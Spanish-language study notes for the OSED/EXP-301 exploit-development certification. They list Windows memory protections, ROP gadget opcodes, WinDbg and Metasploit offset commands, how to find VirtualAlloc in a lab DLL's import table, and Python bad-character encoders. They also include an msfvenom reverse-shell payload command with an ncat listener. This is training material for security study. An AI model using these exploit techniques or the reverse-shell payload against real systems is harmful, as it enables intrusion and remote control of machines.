Algunos Tips y comandos a tener en cuenta, en la certificación OSED/EXP-301

Prevención de Ejecución de Datos (DEP)
Dirección Aleatorización del Diseño Espacial (ASLR)
Control de Flujo de Guardia (CFG)

- subir y bajar procesos
Win+R -> services.msc

P/P/R
58 ==> pop eax
5B ==> pop ebx
59 ==> pop ecx
5A ==> pop edx
5E ==> pop esi
5F ==> pop edi
5D ==> pop ebp
C3 ==> ret

- Probar de forma manual en Windbg que DEP esta habilitado
ed esp 90909090
r eip = esp
p
---------------------------------------------------------------------
- Patrones de metasploit
msf-pattern_create -l 3000
msf-pattern_offset -l 3000 -q 43387143
---------------------------------------------------------------------
- Buscar el IAT en VirtualAlloc
Facil con IDA Pro en los imports 

Forma normal de buscar el IAT que es la dirección del VirtualAlloc(IAT)
!dh MSA2Mfilter03.dll
	   4F000 [     188] address [size] of Import Address Table Directory
dds  MSA2Mfilter03+4F000
	1004f060  7746f660 KERNEL32!VirtualAllocStub
u 0x1004f060
---------------------------------------------------------------------
- Este codigo es un apoyo para encontrar el mejor valor para el EIP gadget
en sublime text poner este codifo REGEX 
(\<push esp\>.*\<pop esi\>)
---------------------------------------------------------------------
- POP EBX y POP ESI eliminarán los gadgets posteriores, por lo que se agrega lo de abajo
ecx = pack("<I",0x50501133)  # XOR ECX,ECX # MOV EAX,ECX # POP EBX # POP ESI # RETN
ecx += pack('<L',0x41414141) # padding for pop ebp
ecx += pack('<L',0x41414141) # padding for pop esi
---------------------------------------------------------------------
- Sacar los Gadgets
copy "C:\Program Files (x86)\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll" .
rp-win-x86.exe -f MSA2Mfilter03.dll -r 5 > rop.txt
---------------------------------------------------------------------
- Para la shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python -b "\x00\x0a" -v shellcode
ncat -lvp 4444
---------------------------------------------------------------------
- Automatización de la codificación del lab de offsec
		Esto se uso cuando msf el shellcode no funciona, por bytes los nulos
		
def mapBadChars(sh):
	BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
	i = 0
	badIndex = []
	while i < len(sh):
		for c in BADCHARS:
			if sh[i] == c:
				badIndex.append(i)
		i=i+1
	return badIndex
	
def encodeShellcode(sh):
	BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
	REPLACECHARS = b"\xff\x10\x06\x07\x08\x05\x1f"
	encodedShell = sh
	for i in range(len(BADCHARS)):
		encodedShell = encodedShell.replace(pack("B", BADCHARS[i]), pack("B", REPLACECHARS[i]))
	return encodedShell


Referencias:

https://hacktips.it/tags/osed/
https://github.com/nop-tech/OSED
https://github.com/epi052/osed-scripts
https://defuse.ca/online-x86-assembler.htm#disassembly
https://github.com/tjcim/rop_regexr
https://github.com/mzdaemon/URLDownloadToFileAShellcode
https://initroot.me/shellcode-methodology
